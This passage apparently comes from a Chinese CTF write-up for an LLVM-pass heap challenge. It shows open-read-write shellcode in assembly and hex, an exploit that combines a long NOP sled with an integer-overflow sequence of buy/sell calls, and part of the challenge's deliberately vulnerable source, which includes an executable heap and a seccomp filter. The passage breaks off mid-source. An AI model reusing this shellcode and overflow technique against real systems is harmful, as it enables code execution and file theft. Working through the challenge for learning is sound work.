class="hljs-string">mov al,2</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov edi,eax</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">xor eax,eax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">xor di,2 </span><br><span class="hljs-string">mov eax,edi</span><br><span class="hljs-string">syscall  </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>)<br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\xba\x66\x6c\x61\x67\x52\x48\x89\xe7\x31\xf6\x48\x31\xc0\xb0\x02\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x66\x83\xf7\x02\x89\xf8\x0f\x05<br></code></pre></td></tr></table></figure><h3 id="3-exp"><a href="#3-exp" class="headerlink" title="3.exp"></a>3.exp</h3><p>概率orw</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sell</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">buy</span><span class="hljs-params">(<span class="hljs-type">int</span> sz)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-type">int</span> idx,<span class="hljs-type">char</span>* buf)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">locate</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">35</span>+<span class="hljs-number">0x800</span>+<span class="hljs-number">0x1</span>] = <span class="hljs-string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xba\x66\x6c\x61\x67\x52\x48\x89\xe7\x31\xf6\x48\x31\xc0\xb0\x02\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x66\x83\xf7\x02\x89\xf8\x0f\x05&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">start</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">sell</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">show</span>();<br><span class="hljs-built_in">buy</span>(<span class="hljs-number">-0x15000</span>);<br><span class="hljs-built_in">show</span>();<br><span class="hljs-built_in">sell</span>(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">show</span>();<br><span class="hljs-built_in">buy</span>(<span class="hljs-number">0x1000</span>);<br><span class="hljs-built_in">show</span>();<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,buf);<br><span class="hljs-built_in">locate</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-源码"><a href="#4-源码" class="headerlink" title="4.源码"></a>4.源码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGSIZE  4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGROUNDDOWN(a) (((a)) &amp; ~(PGSIZE-1))</span><br><span class="hljs-type">void</span> *table[<span class="hljs-number">10</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> chunk_size[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *treasuremap=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> init_done=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> money = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>));<br><span class="hljs-keyword">while</span>(i&lt;<span class="hljs-number">10</span>)&#123;<br>table[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x70</span>);<br>chunk_size[i] = <span class="hljs-number">0x70</span>;<br>i++;<br>&#125;<br>treasuremap = table[<span class="hljs-number">0</span>];<br><span class="hljs-type">int</span> flag=<span class="hljs-number">0</span>;<br><span class="hljs-type">void</span>* heap_addr = (<span class="hljs-type">void</span>*)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)table[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfffffffffffff000</span>);<br>flag = <span class="hljs-built_in">mprotect</span>(heap_addr,<span class="hljs-number">0x8000</span>,PROT_EXEC | PROT_READ | PROT_WRITE);<br><span class="hljs-comment">//errs() &lt;&lt; &quot;modify address : &quot; &lt;&lt; heap_addr &lt;&lt; &#x27;\n&#x27;;</span><br><span class="hljs-comment">//errs() &lt;&lt; &quot;modify flag : &quot; &lt;&lt; flag &lt;&lt; &#x27;\n&#x27;;</span><br><span class="hljs-comment">//errs() &lt;&lt; &quot;heapbase : &quot; &lt;&lt; table[0] &lt;&lt; &#x27;\n&#x27;;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">buried</span><span class="hljs-params">()</span></span>&#123;<br>    scmp_filter_ctx ctx;<br>    ctx = <span class="hljs-built_in">seccomp_init</span>(SCMP_ACT_ALLOW);<br>    <span class="hljs-built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="hljs-built_in">SCMP_SYS</span>(execve), <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="hljs-built_in">SCMP_SYS</span>(execveat), <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">seccomp_load</span>(ctx);<br>    <span class="hljs-comment">//close(1);</span><br>    <span class="hljs-comment">//close(2);</span><br>    <span class="hljs-comment">//errs() &lt;&lt; &quot;treasuremap : &quot; &lt;&lt; treasuremap &lt;&lt; &#x27;\n&#x27;;</span><br>    ((*(<span class="hljs-built_in">void</span>(*) ()) (treasuremap)))(); <span class="hljs-comment">//edit -&gt; shellcode</span><br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">optimizer</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;optimizer&gt; &#123;<br>  <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;FAM)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(!init_done)&#123;<br>    <span class="hljs-built_in">init</span>();<br>    init_done = <span class="hljs-number">1</span>;<br>    &#125;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Legend has it that there is a place where the treasure is buried.&quot;</span> &lt;&lt; std::endl; <br>    std::string VulnName = F.<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">str</span>();<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;You&#x27;re a young business man and you want to : &quot;</span> &lt;&lt; VulnName &lt;&lt; std::endl;<br>    <span class="hljs-keyword">if</span>(VulnName == <span class="hljs-string">&quot;start&quot;</span>)&#123;<br>      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.<span class="hljs-built_in">end</span>();<br>      <span class="hljs-keyword">for</span>(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter = F.<span class="hljs-built_in">begin</span>(); bbIter != bbEnd; ++bbIter)&#123;<br>        SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;<span class="hljs-built_in">begin</span>();<br>        SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;<span class="hljs-built_in">end</span>();<br>        <span class="hljs-keyword">for</span>(; instIter != instEnd; ++instIter)&#123;<br>          <span class="hljs-keyword">if</span> (instIter-&gt;<span class="hljs-built_in">getOpcode</span>() == <span class="hljs-number">56</span>) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-type">const</span> CallInst* call_inst = <span class="hljs-built_in">dyn_cast</span>&lt;CallInst&gt;(instIter)) &#123;<br>              std::string FunctionName = call_inst-&gt;<span class="hljs-built_in">getCalledFunction</span>()-&gt;<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">str</span>();<br>              <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;sell&quot;</span>)&#123;<br>                <span class="hljs-keyword">if</span>(instIter-&gt;<span class="hljs-built_in">getNumOperands</span>()==<span class="hljs-number">2</span>)&#123;<br>                  <span class="hljs-type">int</span> idx1 =  <span class="hljs-built_in">dyn_cast</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="hljs-built_in">getArgOperand</span>(<span class="hljs-number">0</span>))-&gt;<span class="hljs-built_in">getZExtValue</span>();<br>                  <span class="hljs-keyword">if</span>(idx1&gt;=<span class="hljs-number">0</span> &amp;&amp; idx1&lt;<span class="hljs-number">10</span> &amp;&amp; (table[idx1]))&#123;<br><span class="hljs-built_in">free</span>(table[idx1]);<br>table[idx1] = <span class="hljs-number">0</span>;<br>money += chunk_size[idx1];<br>chunk_size[idx1] = <span class="hljs-number">0</span>;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;selled a land&quot;</span> &lt;&lt; std::endl;<br>                  &#125;<br>                  <span class="hljs-keyword">else</span>&#123;<br>                  std::cout &lt;&lt; <span class="hljs-string">&quot;failed to sell&quot;</span> &lt;&lt; std::endl;<br>                  &#125;<br>              &#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;buy&quot;</span>)&#123;<br>                <span class="hljs-keyword">if</span>(instIter-&gt;<span class="hljs-built_in">getNumOperands</span>()==<span class="hljs-number">2</span>)&#123;<br>                <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sz =  <span class="hljs-built_in">dyn_cast</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="hljs-built_in">getArgOperand</span>(<span class="hljs-number">0</span>))-&gt;<span class="hljs-built_in">getZExtValue</span>();<br>                i=<span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span>((<span class="hljs-type">int</span>)sz&lt;=money)&#123;     <span class="hljs-comment">//int overflow</span><br>                <span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span> &amp;&amp; i&lt;=<span class="hljs-number">9</span>)&#123;   <br><span class="hljs-keyword">if</span>(!*(&amp;(table[<span class="hljs-number">0</span>])+i))&#123;<br>*(&amp;(table[<span class="hljs-number">0</span>])+i) = <span class="hljs-built_in">malloc</span>(sz);<br>std::cout &lt;&lt; <span class="hljs-string">&quot;buy a land at : &quot;</span>&lt;&lt; *(&amp;(table[<span class="hljs-number">0</span>])+i) &lt;&lt; std::endl;<br><span class="hljs-comment">//errs() &lt;&lt; &quot;buy a land&quot;&lt;&lt;&#x27;\n&#x27;;</span><br>chunk_size[i] = sz;<br>money -= sz;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>i++;<br>&#125;<br>&#125;<br>                &#125;<br>              &#125;<br>              &#125;<br>              <span 